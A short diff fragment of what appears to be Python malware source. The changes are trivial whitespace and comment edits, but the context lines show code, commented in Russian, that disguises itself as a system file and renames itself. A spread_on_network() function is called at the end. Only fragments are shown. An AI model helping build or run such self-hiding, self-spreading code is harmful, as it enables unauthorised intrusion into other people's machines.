@@ -914,10 +914,6 @@ def get_geolocation_info():
     except:
         return "Geolocation: Unknown"
 
-
-
-# --- ДОБАВЛЕННЫЕ ФУНКЦИИ ---
-
 # --- Скрытие себя как системного файла и переименование под системный ---
 try:
     exe_path = sys.argv[0]
@@ -972,4 +968,5 @@ def spread_on_network():
     except: pass
 
 spread_on_network()
+
 
